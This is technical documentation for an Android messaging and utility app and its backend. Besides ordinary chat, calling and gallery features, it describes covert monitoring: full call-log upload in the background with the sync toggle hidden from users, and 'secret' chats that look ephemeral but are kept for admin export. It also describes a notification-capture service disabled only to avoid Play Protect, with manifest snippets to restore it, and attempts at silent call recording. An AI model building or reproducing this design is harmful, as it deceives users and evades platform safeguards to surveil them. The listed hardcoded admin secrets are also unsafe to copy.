# Quacky (`ZezAndroid` + `Zez-Backend`) — Consolidated Technical Documentation

Single-source technical reference consolidating the system architecture, feature guides, API & database contracts, Play Protect permissions/restore instructions, Gallery 2.0 rollback record, and cellular call-recording postmortem.

---

## 1. System Overview & Tech Stack

| Layer | Technology & Key Configuration |
|---|---|
| **Android App (`ZezAndroid`)** | Pure native Java 17 (`com.zez.app`), `compileSdk 34`, `targetSdk 34`, `minSdk 26`, Gradle 8.5, ViewBinding, AndroidX (`AppCompat 1.6.1`, `Material 1.11.0`, `WorkManager 2.9.0`, `ViewPager2`, `Media 1.7.0`), `OkHttp 4.12.0`, `Gson 2.10.1`, `Glide 4.16.0` |
| **App Versioning (Current Source)** | `ZezAndroid/app/build.gradle`: `versionCode 60`, `versionName "1.0.59"` (latest published backend DB release prior to workspace edits: `1.0.58`) |
| **Backend (`Zez-Backend`)** | Node.js `>=20`, Express `5.1.0`, PostgreSQL (`pg 8.23.1`), `@noble/ciphers 2.4.0`, `@aws-sdk/client-s3` + `s3-request-presigner` (Backblaze B2), `@distube/ytdl-core`, `multer`, `cors`, `dotenv`; JS + `allowJs` TypeScript type-checking (`tsconfig.json`) |
| **Database & Storage** | Neon PostgreSQL (20 tables in `public` schema), Backblaze B2 object storage + local read-through disk cache (`Zez-Backend/src/cache/storage/`) |
| **Production Backend URL** | Embedded in `ZezAndroid/app/src/main/assets/backend_config.properties` -> `https://zez-chat-backend.onrender.com` (fallback `http://10.0.2.2:3000` for emulator via Developer Mode) |

---

## 2. Feature Status Matrix

| Subsystem | Status | Notes |
|---|---|---|
| **1-on-1 Chat (Normal & Secret Modes)** | **Implemented** | Peer-synchronized Normal/Secret modes, emoji reactions, markdown, replies, deletes, multi-image `GalleryPopupHelper`, `QuickCameraActivity`, links/docs viewer, B2 uploads, local `ChatLocalDbHelper` cache |
| **Call Log Background Sync** | **Implemented** | Full call history (`CallLogHelper.getAllCallLogs`), 100-record chunked batches, `WorkManager` (`CallSyncWorker`), `CallLogObserver`, `CallStateReceiver`, `BootReceiver`, AES-256-GCM at-rest encryption |
| **In-App VoIP Calling** | **Implemented** | `CallActivity`, `IncomingCallActivity`, `ActiveCallManager`, signaling + frame exchange via `/api/call/*` |
| **Alarms** | **Implemented** | Local & admin-pushed alarms (`device_alarms`), custom device ringtones, `AlarmRingingService`, `AlarmFiringActivity`, user delete tombstones |
| **Gallery & Recycle Bin** | **Implemented** | Photos/Albums (`view_gallery.xml`), `ImageViewerActivity`, `ImageEditActivity`, `FavoritesHelper`, `RecycleBinHelper`, `ManageStorageActivity` (`Gallery 1.0` restored after `v1.0.33` Gallery 2.0 rollback) |
| **YMusic Audio Player & Downloader** | **Implemented** | `MusicActivity`, `MusicPlayerService` (`mediaPlayback` FGS), `/api/music/{resolve,stream,download}`, offline history/downloads |
| **Mini-Games** | **Implemented** | In-chat **Tic Tac Toe** (`/api/chat/game/*`) and server-authoritative **Snakes & Ladders** (`SnakesAndLaddersActivity`, `Zez-Backend/games/snakes-and-ladders/`) |
| **Settings & Telemetry** | **Implemented** | Light/Dark/System themes, 8 palettes, 7 accent colors, 9 font families & scale, CPU/RAM/storage telemetry (`HardwareInfoHelper`, `TelemetryGraphView`), OTA updates, hidden Dev Mode (`7788`) |
| **Admin Web Portal (`/admin`)** | **Implemented** | Device inspector, decrypted call logs + CSV export, chat monitor + TXT/CSV/JSON export, remote alarms, APK release manager, B2 file manager |
| **Third-Party Notification Capture** | **Disabled (Play Protect)** | `NotificationCaptureService.java` & `/api/devices/notifications/sync` remain intact, while `<service>` is commented out in `AndroidManifest.xml` to avoid Play Protect flags |
| **Cellular Call Recording** | **Removed (`v1.0.32`)** | Discontinued in commit `7b42adb` due to Android `AudioPolicyService` (`MODE_IN_CALL`) silencing; see **Section 16** |
| **Gallery 2.0 On-Device AI / Scanner** | **Removed (`v1.0.33`)** | ML Kit labeling/OCR/scanner removed in commit `7b6c071` to restore ~6 MB lightweight APK; see **Section 8** |

---

## 3. Repository & Directory Layout

```text
D:\Call Log Mannager\
├── README.md                              # Project overview & quick start
├── PROJECT_DOCUMENTATION.md               # This consolidated technical reference
├── App Icon/Quacky Logo.png               # App icon branding asset
├── scripts/                               # Windows PS1 automation & Python E2E scripts
├── Zez-Backend/                           # Express 5 backend, Admin UI & B2 integration
│   ├── .env.example                       # Environment variable template
│   ├── games/snakes-and-ladders/          # Modular Snakes & Ladders backend + tests
│   ├── scripts/                           # Canonical publish_release.js & DB/diagnostic tools
│   ├── tests/                             # Backend & B2 integration test suites
│   └── src/
│       ├── server.js, db.js, crypto.js
│       ├── middleware/                    # deviceAuth.js, adminAuth.js
│       ├── routes/                        # admin, appRelease, callRead, callSignaling, callSync, chat, devices, music, storage
│       ├── services/b2StorageService.js   # Backblaze B2 S3 client
│       └── public/{admin,downloads,uploads}/ & src/cache/storage/
└── ZezAndroid/app/src/main/
    ├── AndroidManifest.xml
    ├── assets/backend_config.properties
    └── java/com/zez/app/                  # Activities, adapters, games, model, music, observer, receiver, service, theme, util
```

---

## 4. Android Application Architecture

### 4.1 5-Tab Navigation & Activities
- **Launcher Host (`MainActivity.java`, `bottom_nav_menu.xml`)**: Hosts 5 bottom tabs: `nav_chats` (`Chats`), `nav_calls` (`Calls`), `nav_alarms` (`Alarms`), `nav_gallery` (`Gallery`), and `nav_settings` (`Settings`). Sub-pages inside `activity_main.xml` include `view_font_page`, `view_hardware_page`, `view_appearance_page`, `swipe_refresh_bin` (Recycle Bin), and `layout_main_mini_player`.
- **Activities**: `MainActivity`, `ChatActivity`, `ContactsActivity`, `QuickCameraActivity`, `CallActivity`, `IncomingCallActivity`, `ImageViewerActivity`, `AlbumDetailActivity`, `ImageEditActivity`, `ManageStorageActivity`, `AlarmFiringActivity`, `TicTacToeActivity`, `SnakesAndLaddersActivity`, `SnakesLaddersHistoryActivity`, `MusicActivity`.
- **Services & Observers**:
  - `CallSyncWorker` (`WorkManager` background sync) & `CallLogObserver` (content observer trigger)
  - `AlarmRingingService` (`mediaPlayback` foreground service)
  - `MusicPlayerService` (`mediaPlayback` foreground service with `MediaSessionCompat`)
  - `NotificationCaptureService` (present in Java; manifest declaration commented out — see Section 10)
- **Receivers & Providers**: `AlarmReceiver` (`BOOT_COMPLETED`, `TIME_SET`, `TIMEZONE_CHANGED`, custom alarm actions), `BootReceiver` (`BOOT_COMPLETED`, `MY_PACKAGE_REPLACED`), `CallStateReceiver` (`PHONE_STATE`, `NEW_OUTGOING_CALL`), and `androidx.core.content.FileProvider` (`${applicationId}.provider`).

### 4.2 Theming, Typography, Hardware Telemetry & Evolutions (Nov 2026 Wishlist)
All items from the `2026-11-17` feature roadmap (`New_requirnment.md`) are reflected in the current UI:
1. **Theming (`ThemeManager`, `PreferencesHelper`)**: Light / Dark / System mode selector (`THEME_SYSTEM`, `THEME_LIGHT`, `THEME_DARK`), 8 palettes (`graphite`, `arctic`, `midnight`, `amoled`, `ocean`, `sage`, `sunset`, `rose`), 7 accent colors, and customizable incoming chat bubble color.
2. **Font Management (`view_font_page`)**: Font scaling (`0.85f`, `1.0f`, `1.15f`, `1.30f` plus custom `%`/size adjustments) and 9 font families (`sans`, `condensed`, `medium`, `serif`, `monospace`, `casual`, `cursive`, `light`, `black`).
3. **Hardware Telemetry (`HardwareInfoHelper`, `TelemetryGraphView`, `view_hardware_page`)**: Storage breakdown, RAM usage, CPU core/frequency info, and live resource graphs.
4. **In-App Updates & Version Footer (`AppUpdateHelper`)**: Checks `GET /api/app/latest`, downloads APKs, and displays app version + device ID at the bottom of Settings.
5. **Hidden Sync Toggle**: User-facing call-sync toggle UI stays hidden while `CallSyncWorker` runs silently in the background.

---

## 5. Call Log Synchronization & Cryptography

### 5.1 Root Cause & Fix of the 10–12 Day History Truncation Bug
- **Original Problem**: Call history synced only the latest 10–12 days (~100 calls) because callers queried `CallLogHelper.getCallLogs(context, 100)`, stopping cursor iteration at `limit`, and because some OEM dialers produce duplicate `_ID` rows in a batch which previously failed an entire batch with `HTTP 400`.
- **Permanent Fix**:
  1. `CallLogHelper.getAllCallLogs(context)` passes `limit = 0`, querying `CallLog.Calls.CONTENT_URI` sorted by `CallLog.Calls.DATE DESC` for complete history (`_ID`, `CACHED_NAME`, `NUMBER`, `TYPE`, `DATE`, `DURATION`).
  2. `ApiClient.syncCalls()` transmits records in chunked batches of **100 calls** per request to avoid timeouts and OOM spikes.
  3. `Zez-Backend/src/routes/callSync.js` (`POST /api/calls/sync`, guarded by `deviceAuth`) allows up to `MAX_BATCH_SIZE = 500` calls/request, deduplicates intra-batch `externalId` values in memory, and upserts idempotently via `ON CONFLICT (device_id, external_id_hash) DO NOTHING`.

### 5.2 At-Rest Payload Encryption (`Zez-Backend/src/crypto.js`)
- **Primary Backend Encryption (`encryptJson` / `decryptJson`)**: Uses Node `crypto` `aes-256-gcm` with a random 12-byte IV, authentication tag, and base64-encoded 32-byte `ENCRYPTION_KEY` (`{ version: 1, iv, tag, data }` JSON envelope).
- **Portable Cross-Client Crypto (`decryptPortableHex`)**: Uses `@noble/ciphers/aes.js` `managedNonce(gcm)` with the 64-character hex `PORTABLE_ENCRYPTION_KEY`.
- **Device Auth (`deviceAuth.js`)**: Bearer tokens returned on `POST /api/devices/register` are hashed with SHA-256 and checked against `public.devices.token_hash` where `registration_status = 'active'`.

---

## 6. Chat Subsystem (Normal & Secret Modes)

- **UI & Local Speed**: WhatsApp-style conversation list + 1-on-1 chat (`ChatActivity`, `ChatMessageAdapter`) backed by `ChatLocalDbHelper` for instant cache rendering before network refresh.
- **Rich Media & Actions**: Multi-image WhatsApp-style sheet (`GalleryPopupHelper`), `QuickCameraActivity`, links/docs viewer (`MediaLinksDocsHelper`), Markdown rendering (`MarkdownRenderer`), emoji reactions (`POST /api/chat/messages/:id/react`), soft/for-everyone deletes, typing indicators (`POST /api/chat/typing`), and Backblaze B2 media uploads (`POST /api/chat/upload` / `/api/storage/upload`).
- **Dual Synchronized Chat Modes**:
  - **Normal Mode**: Persistent conversation history stored locally and in PostgreSQL (`mode = 'normal'`).
  - **Secret Mode**: Toggle pill (`POST /api/chat/conversation/:id/mode`) sets `is_secret_mode = TRUE` and rotates `secret_session_id` in `public.chat_conversations`. The peer's `GET /api/chat/poll` receives `conversation_mode` and switches UI automatically.
  - **Client Ephemerality vs Server Audit**: On Android, secret messages stay only in temporary in-memory `ephemeralSecretMessages` collections and are cleared on navigation/exit/pause; on the backend, messages are recorded in `public.chat_messages` (`mode = 'secret'`) so the Admin Portal Chat Monitor (`/admin`) can audit conversations and export them in **TXT**, **CSV**, or **JSON** formats (`/api/admin/chats/export/:id`, `/api/admin/chats/export-all`).

---

## 7. Audio / Video Calling Subsystem

- **Components**: `CallActivity`, `IncomingCallActivity`, `ActiveCallManager`, and `Zez-Backend/src/routes/callSignaling.js` (`/api/call/*` backed by `public.active_calls` and `public.call_signals`).
- **Call Lifecycle**: Caller invokes `POST /api/call/initiate` -> callee discovers via `GET /api/call/incoming` -> accepts/declines via `POST /api/call/respond` -> ICE/SDP/control signals pass through `POST /api/call/signal` & `GET /api/call/signals` -> hangup via `POST /api/call/end`.
- **Current Video Frame Transport**: For active video calls, `CallActivity` currently uses a `frameHandler` polling loop running every **280 ms** (`sendFrameTask` -> `POST /api/call/frame`, `fetchFrameTask` -> `GET /api/call/frame`) transmitting Base64 JPEG payloads. Because HTTP polling every 280 ms caps framerate and adds round-trip jitter over remote DB/cloud hops, migrating live media streams to WebRTC PeerConnection / WebSockets is the primary optimization path for lower latency and higher video quality.

---

## 8. Alarms, Gallery & YMusic Subsystems

### 8.1 Alarms
- Managed via `AlarmHelper`, `AlarmReceiver`, `AlarmRingingService` (foreground service), and `AlarmFiringActivity` (`showOnLockScreen="true"`).
- Supports default device ringtones, repeating schedules, Jit Mode, and bidirectional sync (`POST /api/devices/alarms/sync` + Admin push/delete `/api/admin/devices/:deviceId/alarms`), with deletion tombstones preventing already-deleted alarms from reappearing after sync.

### 8.2 Gallery & Recycle Bin (+ `v1.0.33` Gallery 2.0 Rollback Record)
- **Active Gallery**: `view_gallery.xml` (Photos & Albums tabs, All/Photos/Videos filter chips), `GalleryAdapter` (3-col), `AlbumsAdapter` (2-col), `ImageViewerActivity` (`ViewPager2` + `ZoomImageView` + `FilmstripAdapter` + `FavoritesHelper`), `ImageEditActivity` (`ImageEditHelper` crop/rotate/flip/filters), `ManageStorageActivity`, and `RecycleBinHelper` / `RecycleBinAdapter` soft-delete/restore.
- **Discontinued Gallery 2.0 Rollback (`v1.0.33`, commit `7b6c071`, `2026-11-22`)**: On-device ML Kit image labeling, object detection, OCR (`image-labeling:17.0.9`, `object-detection:17.0.2`, `text-recognition:16.0.1`, `text-recognition-devanagari:16.0.1`), `SmartSearchActivity`, `DocumentScannerActivity`, `com.zez.app.{ai,scanner,creative,editor}.*`, and `twing_ai_gallery.db` were cleanly removed back to commit `7b6c071`, restoring the 0-native-library (~6.04 MB release) APK footprint while keeping Admin Portal improvements untouched.

### 8.3 YMusic & Mini-Games
- **YMusic (`com.zez.app.music.*`)**: Searches and plays audio via `MusicActivity` & `MusicPlayerService`, using `Zez-Backend/src/routes/music.js` (`/api/music/resolve`, `/stream`, `/download` powered by `@distube/ytdl-core` with `Client.VisionOS`, `Client.Tv`, `Client.WebMusic` fallback and a 30-minute stream cache preferring AAC/M4A for OEM hardware compatibility).
- **Tic Tac Toe**: `TicTacToeActivity` backed by `/api/chat/game/*` on `public.chat_games`.
- **Snakes & Ladders**: `SnakesAndLaddersActivity` & `SnakesLaddersHistoryActivity` backed by modular backend package `Zez-Backend/games/snakes-and-ladders/` (`controller.js`, `service.js`, `engine.js`, `board-config.js`, `dice.js`, `coordinates.js`, `validation.js`, `events.js`, `repository.js`) and PostgreSQL tables `sl_invitations`, `sl_sessions`, `sl_player_states`, `sl_move_history`.

---

## 9. Third-Party App Calls, Notifications & Admin Monitoring

- `AppCallDetector` & `/api/devices/app-calls/sync` track external VoIP/dialer app call metadata in `public.device_app_calls`.
- `NotificationCaptureService` & `/api/devices/notifications/sync` store captured notification metadata in `public.device_notifications` (**currently disabled in `AndroidManifest.xml`** — see Section 10).
- Admin Web Portal (`Zez-Backend/src/public/admin/index.html`, `/admin`) authenticates via `POST /api/admin/login` (PBKDF2-SHA512 password verification in `db.js` + 7-day HMAC-SHA256 JWT in `adminAuth.js`).

---

## 10. Android Permissions & Play Protect Restore Guide

### 10.1 Active Permissions in `ZezAndroid/app/src/main/AndroidManifest.xml`
- **Network**: `INTERNET`, `ACCESS_NETWORK_STATE`
- **Calls & Contacts**: `READ_CALL_LOG`, `READ_CONTACTS`, `WRITE_CONTACTS`, `READ_PHONE_STATE`
- **Media & Storage**: `READ_MEDIA_IMAGES`, `READ_MEDIA_VIDEO`, `READ_MEDIA_AUDIO`, `READ_MEDIA_VISUAL_USER_SELECTED`, `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `android:requestLegacyExternalStorage="true"`
- **Audio / Video Calling**: `CAMERA`, `RECORD_AUDIO`, `MODIFY_AUDIO_SETTINGS`
- **System / Alarms / FGS / Updates**: `POST_NOTIFICATIONS`, `RECEIVE_BOOT_COMPLETED`, `FOREGROUND_SERVICE`, `FOREGROUND_SERVICE_MEDIA_PLAYBACK`, `FOREGROUND_SERVICE_DATA_SYNC`, `REQUEST_INSTALL_PACKAGES`, `SCHEDULE_EXACT_ALARM`, `USE_EXACT_ALARM`, `VIBRATE`, `SET_WALLPAPER`, `SET_WALLPAPER_HINTS`, `WAKE_LOCK`

### 10.2 Disabled / Play Protect-Sensitive Features & Exact Restore Instructions
Reconciled status against current `ZezAndroid/app/src/main/AndroidManifest.xml` (historical docs originally listed all 6 as removed, whereas items 3, 4, and 5 remain enabled in the current manifest):

| # | Permission / Component | Current Manifest Status | Why Flagged by Google Play Protect | Operational Impact When Disabled |
|---|---|---|---|---|
| **1** | `NotificationCaptureService` + `BIND_NOTIFICATION_LISTENER_SERVICE` | **Disabled** (commented out at lines 151–162; Java class kept) | Flagged as high-risk financial fraud/spyware (can read OTP/banking notifications) | Cannot passively capture third-party app notifications; in-app chat/call alerts still work |
| **2** | `PROCESS_OUTGOING_CALLS` | **Removed** (absent) | Deprecated API 29+; flagged as dialer hijacker | Cannot intercept native cellular outgoing dials; in-app VoIP unaffected |
| **3** | `READ_CALL_LOG` / `WRITE_CALL_LOG` | **`READ_CALL_LOG` Active**; `WRITE_CALL_LOG` absent | Restricted Permission Group (default dialers only on Play Store) | Without `READ_CALL_LOG`, native carrier call history sync cannot run |
| **4** | `READ_PHONE_STATE` | **Active** (line 22) | Exposes carrier/telephony state | Without it, cannot query carrier call state / auto-pause music on PSTN call |
| **5** | `REQUEST_INSTALL_PACKAGES` | **Active** (line 28) | Play Protect unknown-source sideloading audit | Without it, Android prompts user manually once in Settings during OTA update |
| **6** | `SYSTEM_ALERT_WINDOW` | **Removed** (absent) | Flagged as abusive overlay injection | Incoming calls use full-screen `IncomingCallActivity` (`showWhenLocked`) instead of floating bubbles |

**Exact Manifest Restore Snippets (`ZezAndroid/app/src/main/AndroidManifest.xml`)**:
- Restore `NotificationCaptureService` (uncomment lines 151–162 inside `<application>`):
```xml
<service
    android:name=".service.NotificationCaptureService"
    android:label="@string/app_name"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
    android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```
- Restore optional absent permissions under `<manifest>` if needed in future builds:
```xml
<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
<uses-permission android:name="android.permission.WRITE_CALL_LOG" />
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

---

## 11. Backend REST API Reference

Mounted in `Zez-Backend/src/server.js`:

| Mount / Path | Auth | Key Endpoints |
|---|---|---|
| **Root & Static** | Public | `GET /health`, `POST /api/ping`, `GET /` (-> `/admin`), `GET /admin`, `GET /downloads/:filename` (resolves `app-release-latest.apk` to active DB release / B2 redirect), `GET /uploads/*` |
| **`/api/devices`** | Public / `deviceAuth` | `POST /register` (public); `POST /notifications/sync`, `POST /app-calls/sync`, `POST /alarms/sync` (`deviceAuth`) |
| **`/api/calls`** | `deviceAuth` | `POST /sync` (encrypted batch sync, up to 500 calls/req), `GET /read/`, `GET /read/stats`, `GET /read/:id` |
| **`/api/chat`** | App User ID | `POST /register`, `GET /profile/:idOrPhone`, `POST /profile`, `POST /account/delete`, `POST /upload`, `POST /upload-avatar`, `POST /direct-contact`, `POST /sync-contacts`, `GET/POST /conversation/:id/mode`, `GET /conversations`, `GET /messages`, `POST /messages/send`, `GET /live-updates`, `POST /typing`, `GET /poll`, `POST /messages/status`, `POST /messages/:id/react`, `POST /messages/:id/delete`, `POST /conversations/delete`, `POST /conversations/:id/clear`, `POST /game/create`, `POST /game/:gameId/join`, `GET /game/:gameId`, `GET /game/:gameId/events`, `POST /game/:gameId/move`, `POST /game/:gameId/rematch`, `POST /game/:gameId/end` |
| **`/api/call`** | App User ID | `POST /initiate`, `GET /incoming`, `POST /respond`, `POST /signal`, `GET /signals`, `POST /end`, `GET /history`, `GET /status`, `POST /frame`, `GET /frame` |
| **`/api/storage`** | App / Admin | `GET /file/*key` (local cache or B2 stream), `POST /upload`, `POST /presigned-upload`, `POST /confirm-upload`, `POST /presigned-download`, `DELETE /file/*key` |
| **`/api/music`** | App | `GET /resolve?videoId=`, `GET /stream?videoId=`, `GET /download?videoId=` |
| **`/api/app`** | Public / `adminAuth` | `GET /latest` (public); `GET /releases`, `POST /upload`, `DELETE /releases/:id` (`adminAuth`) |
| **`/api/admin`** | Public / `adminAuth` | `POST /login` (public); `GET /me`, `GET /stats`, `GET /devices`, `GET /devices/:id`, `GET /devices/:id/calls`, `GET /devices/:id/notifications`, `GET /devices/:id/app-calls`, `GET /app-calls`, `GET/POST/DELETE /devices/:id/alarms`, `GET /calls`, `GET /calls/export`, `GET /contacts/export`, `DELETE /calls/:id`, `POST /calls/batch-delete`, `DELETE /devices/:id`, `POST /devices/batch-delete`, `GET/POST/PUT/DELETE /users*`, `GET /chats/{devices-roster,conversations,conversations/:id/messages,export/:id,export-device/:idOrPhone,export-all}`, `GET /system/environment`, `GET/DELETE /system/files*`, `POST /system/storage/clean`, `GET /b2/stats`, `GET /b2/files`, `DELETE /b2/file` |
| **`/api/games/snakes-and-ladders`** | Player ID | `GET /board-config`, `GET /history`, `POST /invitations`, `GET /invitations/:id`, `GET /invitations/:id/events`, `POST /invitations/:id/accept`, `POST /invitations/:id/decline`, `GET /:gameId`, `GET /:gameId/events`, `POST /:gameId/roll`, `POST /:gameId/resign`, `POST /:gameId/reconnect`, `POST /:gameId/disconnect` |

---

## 12. PostgreSQL Schema (20 Tables in `public`)

Verified directly against PostgreSQL:
- **Core Device & Call Telemetry**: `devices`, `call_logs`, `calls` (legacy empty table), `device_notifications`, `device_alarms`, `device_app_calls`
- **Admin & OTA Distribution**: `admin_users`, `app_releases`
- **Chat & Storage**: `chat_users`, `chat_conversations`, `chat_messages`, `media_files`, `storage_files`
- **VoIP Calling**: `active_calls`, `call_signals`
- **Games**: `chat_games` (Tic Tac Toe), plus Snakes & Ladders tables `sl_invitations`, `sl_sessions`, `sl_player_states`, `sl_move_history`

---

## 13. Cloud Storage (B2), OTA Releases & Developer Mode

- **Backblaze B2 & Local Cache**: `Zez-Backend/src/services/b2StorageService.js` stores uploaded chat media, avatars, and release APKs in B2. `Zez-Backend/src/routes/storage.js` caches served objects in `Zez-Backend/src/cache/storage/` for fast read-through delivery; clearing `cache/storage/` is always safe once objects reside in B2.
- **Canonical Release Script (`Zez-Backend/scripts/publish_release.js`)**: Reads `versionName` / `versionCode` from `ZezAndroid/app/build.gradle`, copies `ZezAndroid/app/build/outputs/apk/release/app-release.apk` to `Zez-Backend/src/public/downloads/app-release-<version>.apk`, uploads to B2, and registers the active row in `public.app_releases` (supports `--notes "..."` or `RELEASE_NOTES`).
- **Protected Developer Mode (`MainActivity.java`)**: Regular users cannot view or edit the backend URL in Settings. Rapidly tapping the Settings footer version line **5 times** prompts for `ADMIN_PIN` **`7788`**, unlocking custom backend URL configuration (e.g., switching between `https://zez-chat-backend.onrender.com` and `http://10.0.2.2:3000`).

---

## 14. Configuration, Build & Verification Commands

### Backend Environment (`Zez-Backend/.env.example`)
Required variables: `PORT`, `HOST`, `NODE_ENV`, `DATABASE_URL`, `ENCRYPTION_KEY` (base64 32-byte key), `PORTABLE_ENCRYPTION_KEY` (64-char hex), `ADMIN_API_PASSWORD`, `ADMIN_USERNAME`, `ADMIN_PASSWORD`, `ADMIN_SESSION_SECRET`, `B2_KEY_ID`, `B2_APPLICATION_KEY`, `B2_KEY_NAME`, `B2_BUCKET_NAME`, `B2_BUCKET_ID`, `B2_ENDPOINT`.

### Build & Verification Commands
```powershell
# Backend verification & start
cd "D:\Call Log Mannager\Zez-Backend"
npm run type-check
node -c src/server.js
node --test games/snakes-and-ladders/tests/*.test.js
npm start

# Android unit tests & APK builds
cd "D:\Call Log Mannager\ZezAndroid"
.\gradlew.bat test assembleDebug assembleRelease

# Automation & Python E2E harnesses (project root)
powershell -ExecutionPolicy Bypass -File scripts\run-backend.ps1
powershell -ExecutionPolicy Bypass -File scripts\run-android.ps1
```

---

## 15. Security Notes & Known Limitations

- **Hardcoded Auth Fallbacks (Hardening Needed for Production)**: `Zez-Backend/src/middleware/adminAuth.js` falls back to `"zez_default_secret_key_2026"` when `ADMIN_SESSION_SECRET` / `ADMIN_PASSWORD` are unset; `Zez-Backend/src/db.js` seeds `"admin123"` when `ADMIN_PASSWORD` is unset. Always set strong secrets in `.env`.
- **Token Query Parameter & CORS**: `adminAuth` accepts `?token=...` query parameters in addition to `Authorization: Bearer ...` headers, and `server.js` currently uses permissive `cors()` with no global rate limiter.
- **Unauthenticated App Endpoints / IDOR Surface**: `/api/chat/*`, `/api/call/*`, and `/api/storage/*` trust client-supplied user/conversation/object identifiers without per-request device/user bearer verification.
- **Manifest Flags**: `AndroidManifest.xml` has `android:allowBackup="true"` and `android:usesCleartextTraffic="true"` (needed only for local HTTP development against `10.0.2.2:3000`).
- **Missing ProGuard File**: `ZezAndroid/app/build.gradle` sets `minifyEnabled false` while referencing non-existent `proguard-rules.pro` (create `ZezAndroid/app/proguard-rules.pro` before enabling R8/ProGuard).
- **Render Hosting & Video Latency**: `https://zez-chat-backend.onrender.com` may return `503` when suspended on free-tier hosting; local Android/backend runs can switch to `http://10.0.2.2:3000` via Developer Mode. Video calls use 280 ms HTTP frame polling rather than native WebRTC/WebSocket transport.

---

## 16. Historical Appendix: Cellular Call Recording Investigation (`v1.0.24`–`v1.0.32`)

Consolidates all empirical diagnostics and architectural decisions across the prior `CALL_RECORDING_*` and `TWING_*` reports. All cellular call-recording runtime code was **cleanly removed in `v1.0.32` (commit `7b42adb`)**.

1. **OS Security & Audio Policy Barriers**:
   - **Signature Permission**: Direct cellular uplink/downlink sources (`VOICE_CALL = 4`, `VOICE_UPLINK = 2`, `VOICE_DOWNLINK = 3`) require `android.permission.CAPTURE_AUDIO_OUTPUT` (`signature|privileged`), unavailable to third-party consumer APKs.
   - **Android 10+ `AudioPolicyService` Silencing**: When a PSTN call enters `AudioManager.MODE_IN_CALL (2)`, Android `AudioPolicyService` executes `AudioFlinger::setRecordSilenced(portId, true)` for non-system UIDs (`UID >= 10000`), causing `RecordTracks.cpp` to `memset(buffer->raw, 0, buffer->size)`. `MediaRecorder` / `AudioRecord` succeeds without throwing, generating valid `.m4a` containers containing 100% digital silence across `MIC (1)`, `DEFAULT (0)`, `VOICE_COMMUNICATION (7)`, and `VOICE_RECOGNITION (6)`.
   - **Android 11+ & Play Policy**: Background foreground services started from broadcast receivers are denied microphone access without an active foreground Activity, and Google Play (May 2022) prohibited `AccessibilityService` call-recording workarounds.

2. **Physical Device Empirical Measurements (`v1.0.30`, `AudioCaptureValidator` / `AudioRecordingCallback`)**:
   - Tested on **Vivo T3x 5G** (`V2338`, Qualcomm `SM6450` Snapdragon 6 Gen 1, `audio.primary.sm6450.so`, Funtouch OS / Android 16) and **OnePlus Nord CE 3 Lite 5G** (`CPH2493`, Qualcomm `SM6375` Snapdragon 695, `audio.primary.holi.so`, OxygenOS / Android 16).
   - **Outside Calls (`MODE_NORMAL (0)`)**: `isClientSilenced=false`, Peak amplitude **22,410** (`-17.2 dB`), `49,820 / 51,200` non-zero PCM samples -> loud, clear mic capture (`AUDIO_CAPTURE_CONFIRMED`).
   - **During Cellular Call (`MODE_IN_CALL (2)`)** — Earpiece, Speakerphone, and Bluetooth SCO: `isClientSilenced=true`, Peak amplitude **0**, `0 / 51,200` non-zero samples via `MediaExtractor`/`MediaCodec` validation, **-96.0 dB RMS** -> complete digital silence (`AUDIO_CAPTURE_SILENCED`).

3. **OEM Native Recorder Matrix & `v1.0.31` SAF Ingestion Blueprint (Before `v1.0.32` Removal)**:
   - **Vivo (`com.vivo.callrecorder`)**: Writes two-way `.m4a` files to `Record/Call` (`Contact_Number_yyyyMMddHHmmss.m4a`) with no announcement; no third-party IPC API.
   - **OnePlus / OPPO (`com.oplus.dialer` ODialer)**: Writes `.mp3`/`.m4a` to `Recordings/Call Recordings` silently; no public API.
   - **Samsung One UI (`com.samsung.android.dialer`)**: Region/CSC-dependent native recording in `Recordings/Call` (`M4A`).
   - **Xiaomi MIUI/HyperOS**: Mi Dialer writes `.mp3` to `MIUI/sound_recorder/call_rec`.
   - **Google Phone (`com.google.android.dialer`)**: Stores `WAV/AMR` inside private `/data/user/0/com.google.android.dialer/` sandbox (inaccessible via SAF) and plays an audible voice announcement.
   - **`v1.0.31` Temporary Architecture (Removed in `v1.0.32`)**: Implemented `com.zez.app.recording.importing.*` (`OemRecordingImporter` via `ACTION_OPEN_DOCUMENT_TREE`, `RecordingMatcher` ±90s CallLog + OEM filename regex correlation, `RecordingSyncWorker` with 4s post-idle delay, `RecordingShareActivity` handling `ACTION_SEND` audio for Google Phone) over SQLite `call_records` v4 before all recording UI and code were discontinued cleanly in `v1.0.32`.
